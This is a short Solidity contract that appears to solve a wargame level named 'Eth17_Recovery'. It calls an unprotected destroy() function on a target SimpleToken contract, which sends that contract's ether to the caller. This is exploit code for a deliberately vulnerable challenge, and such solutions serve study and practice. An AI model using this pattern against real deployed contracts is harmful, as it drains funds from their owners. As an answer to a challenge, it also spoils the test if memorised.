// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "../Eth17_Recovery.sol";

contract RecoverAddress {
    SimpleToken target;
    address payable me;
    function recoverEth(address payable _lostAddress) external {
        me = payable(msg.sender);
        target = SimpleToken(_lostAddress);
        target.destroy(me);
    }
}